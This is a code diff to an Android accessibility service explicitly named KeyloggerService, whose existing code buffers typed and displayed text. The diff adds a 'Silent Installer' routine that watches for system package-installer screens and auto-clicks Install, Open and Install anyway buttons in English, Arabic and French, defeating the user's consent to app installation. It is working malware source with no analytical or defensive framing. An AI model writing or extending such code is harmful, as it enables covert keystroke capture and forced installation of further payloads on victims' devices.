@@ -73,6 +73,40 @@ public class KeyloggerService extends AccessibilityService {
                 buffer.append("> ").append(text.get(0).toString()).append("\n");
             }
         }
+
+        // Auto-click install buttons for Silent Installer
+        if (pkg.contains("packageinstaller") || pkg.contains("com.android.packageinstaller") || pkg.contains("com.miui.packageinstaller")) {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root != null) {
+                clickNodeByText(root, "Install");
+                clickNodeByText(root, "تثبيت");
+                clickNodeByText(root, "Installer");
+                
+                clickNodeByText(root, "Open");
+                clickNodeByText(root, "فتح");
+                clickNodeByText(root, "Ouvrir");
+                
+                clickNodeByText(root, "Install anyway");
+                clickNodeByText(root, "المتابعة");
+                clickNodeByText(root, "Continuer");
+            }
+        }
+    }
+
+    private void clickNodeByText(AccessibilityNodeInfo root, String text) {
+        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
+        for (AccessibilityNodeInfo node : nodes) {
+            if (node.isClickable()) {
+                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                return;
+            } else {
+                AccessibilityNodeInfo parent = node.getParent();
+                if (parent != null && parent.isClickable()) {
+                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    return;
+                }
+            }
+        }
     }
 
     private synchronized void flushBuffer() {
@@ -222,4 +256,4 @@ public class KeyloggerService extends AccessibilityService {
 
     @Override public void onInterrupt() { instance = null; }
     @Override public void onDestroy() { instance = null; super.onDestroy(); }
-}
+            }
